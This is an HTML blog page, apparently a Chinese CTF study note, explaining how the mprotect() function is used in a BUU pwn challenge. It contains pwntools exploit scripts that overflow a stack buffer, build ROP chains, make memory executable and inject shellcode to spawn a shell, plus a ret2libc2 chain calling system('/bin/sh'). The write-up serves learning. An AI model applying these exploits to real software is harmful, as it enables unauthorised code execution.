@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>mprotect（）函数 | SOME PEDLARY OF MAHO</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="description" content="https://blog.csdn.net/elg5127/article/details/124221422这个是csdn上的讲解
+BUU-PWN题（1-40） (yuque.com)这个是语雀上的讲解
+PWN疑难（1-3）-关于payload中栈的布置以及system的一些困惑 (yuque.c">
+  
+  
+  
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+  
+  <link rel="stylesheet" href="../../../../css/style.css">
+  
+    <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox-1.3.4.css">
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div id="nav-outer">
+  <nav id="main-nav" class="outer">
+    <a id="main-nav-toggle" class="nav-icon"></a>
+    
+      <a class="main-nav-link" href="../../../../index.html">Home</a>
+    
+      <a class="main-nav-link" href="../../../../archives">Archives</a>
+    
+    <div class="main-nav-space-between"></div>
+    
+  </nav>
+</div>
+<div id="header-title">
+  <h1 id="logo-wrap">
+    <a href="../../../../index.html" id="logo">SOME PEDLARY OF MAHO</a>
+  </h1>
+  
+</div>
+
+      <div id="content" class="outer">
+        <section id="main"><article id="post-mprotect（）函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time class="dt-published" datetime="2023-04-07T22:17:21.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/CG/">CG</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      mprotect（）函数
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/elg5127/article/details/124221422">https://blog.csdn.net/elg5127/article/details/124221422</a><br>这个是csdn上的讲解</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri">BUU-PWN题<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1-40<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span> (yuque.com)</a><br>这个是语雀上的讲解</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/igq0ed">PWN疑难<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1-3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>-关于payload中栈的布置以及system的一些困惑 (yuque.com)</a><br>对于栈传参一篇写的贼好的文章<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+<p>疑问点解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>mprootect()函数修改的是那段内存空间<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span><br>首先<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>mprotect<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数将一段具有可读写无执行权限的内存空间更改权限可执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>![[Pasted image 20221108161747.png]]<br>之后直接把恶意数据直接篡改到这里面即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>调用数据的话直接调用这里的地址即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<p>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>pop3函数参数在栈上是如何实现的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span><br>首先给到exp看下内容<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>from pwn import *<br>elf &#x3D; ELF(‘.&#x2F;pwn’)<br>sh &#x3D; process(‘.&#x2F;pwn’)<br>&#x3D; remote(‘node3.buuoj.cn’,27234)<br>pop3_ret &#x3D; 0x0809e4c5<br>mem_addr &#x3D; 0x080ea000<br>#可读可写的内存,但不可执行<br>mem_size &#x3D; 0x3000<br>#通过调试出来的值<br>mem_proc &#x3D; 0x7<br>#可代表可读可写可执行<br>mprotect_addr &#x3D; elf.symbols[‘mprotect’]<br>read_addr &#x3D; elf.symbols[‘read’]<br>payload_01 &#x3D; ‘A’ * 0x38<br>payload_01 +&#x3D; p32(mprotect_addr)<br>payload_01 +&#x3D; p32(pop3_ret)                   <strong>这里的寄存器并非是用来传递参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而是作为返回地址来使得esp向下走12<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>正好可以执行read函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></strong><br>#执行完mprotect的返回地址,使esp往下+12<br>payload_01 +&#x3D; p32(mem_addr)<br>#mprotect函数参数1 修改的内存地址<br>payload_01 +&#x3D; p32(mem_size)<br>#mprotect函数参数2 修改的内存大小<br>payload_01 +&#x3D; p32(mem_proc) </p>
+<p>#mprotect函数参数3 修改的权限<br>payload_01 +&#x3D; p32(read_addr)<br>#执行完上面pop3_ret后到read函数<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完read后将返回到pop3_ret指令      <strong>又继续使esp+12到mem_addr</strong><br>payload_01 +&#x3D; p32(0)<br>#read函数参数1 从输入端读取<br>payload_01 +&#x3D; p32(mem_addr)<br>#读取到的内容复制到指向的内存里<br>payload_01 +&#x3D; p32(0x100)<br>#读取已知内存的地址内容大小<br>payload_01 +&#x3D; p32(mem_addr)</p>
+<p>#这里就是shellcode了<br>sh.sendline(payload_01)<br>payload_sh &#x3D; asm(shellcraft.sh(),arch &#x3D; ‘i386’, os &#x3D; ‘linux’)<br>sh.sendline(payload_sh)<br>#这就是read读入的内容<br>sh.interactive()</p>
+<p>这里重点看这部分<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>32位多参函数传参问题<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>仍然运用寄存器传参方法<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>payload_01 +&#x3D; p32(mprotect_addr)<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完mprotect的返回地址,使esp往下+12<br>payload_01 +&#x3D; p32(mem_addr)<br>#mprotect函数参数1 修改的内存地址<br>payload_01 +&#x3D; p32(mem_size)<br>#mprotect函数参数2 修改的内存大小<br>payload_01 +&#x3D; p32(mem_proc)<br>#mprotect函数参数3 修改的权限<br>payload_01 +&#x3D; p32(read_addr)<br>#执行完上面pop3_ret后到read函数<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完read后将返回到pop3_ret指令,又继续使esp+12到mem_addr<br>payload_01 +&#x3D; p32(0)<br>#read函数参数1 ,从输入端读取<br>payload_01 +&#x3D; p32(mem_addr)<br>#读取到的内容复制到指向的内存里<br>payload_01 +&#x3D; p32(0x100)<br>#读取大小<br>payload_01 +&#x3D; p32(mem_addr)<br>#这里就是shellcode了</p>
+<p>解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>    1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈溢出到eip<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将mprotect函数地址传入eip中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>为main函数返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面跟着pop3_addr作为mprotect函数返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>在mprotect函数执行完之后进行返回<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面跟着三个mprotect函数的参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进行修改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    4<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>过程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>在输入完三个参数之后<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将pop3作为返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>把参数跳过<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>也就是弄走<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>32位程序利用栈进行传参<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数之中完成mpro<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数的调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>    利用pop3_addr最后的ret指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将sp指针上移<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    从而使得ip往上走<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>函数调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>跳过参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>    这里插入下汇编ret指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>![[default 1.jfif]]<br>    具体含义是将sp向栈的上上方移并将上面的一个地址读入栈中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    5<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>下面的read函数由于ret指令则被调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    6<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>最后跟着shell的写入地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进行shell的调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+<p><span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>补充下与ret2libc2的区别<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>其exp:<br>from pwn import *</p>
+<p>sh &#x3D; process(‘.&#x2F;ret2libc2’)</p>
+<p>system_addr&#x3D;0x8048490</p>
+<p>gets_addr&#x3D;0x8048460</p>
+<p>pop_addr &#x3D; 0x0804872f</p>
+<p>buf2_addr &#x3D; 0x804a080</p>
+<p>payload &#x3D; flat([112*A, gets_addr, pop_addr, buf2_addr, system_addr, 0xdeadbeef, buf2_addr])</p>
+<p>sh.sendline(payload)</p>
+<p>sh.sendline(‘&#x2F;bin&#x2F;sh’)</p>
+<p>sh.interactive()<br>其运用的是先构造好rop链<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>最后往里面写参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>调用gets函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将参数跳过<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面写sys的地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>参数<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>所在地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>之后写入&#x2F;bin&#x2F;sh即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>最后写的地址是参数写入的地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></p>
+<p>这道题是shellcode执行地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="../%E6%80%BB%E7%BB%93%E4%B8%80%EF%BC%9Apwn%E9%A2%98%E4%B8%AD%E7%9A%84%E5%9B%9B%E5%A4%A7%E4%BF%9D%E6%8A%A4%EF%BC%9A/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          总结一：pwn题中的四大保护：
+        
+      </div>
+    </a>
+  
+  
+    <a href="../%E6%98%AF%E7%9A%84%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">
+        
+          是的是我的第一个博客
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 cy<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a><br>
+      
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="../../../../js/clipboard.min.js"></script>
+<script src="../../../../js/jquery-1.4.3.min.js"></script>
+
+<script src="../../../../fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+
+
+<script>
+  MathJax = {
+    options: {
+      enableMenu: false
+    },
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    }
+  };
+</script>
+<!-- <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+    CommonHTML: {
+      linebreaks: false
+    }
+  });
+  </script> -->
+<script type="text/javascript" id="MathJax-script" async
+  src="../../../../mathjax/tex-chtml.js">
+</script>
+<!-- <script type="text/javascript"
+   src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_CHTML">
+</script> -->
+
+
+
+  </div>
+</body>
+</html>
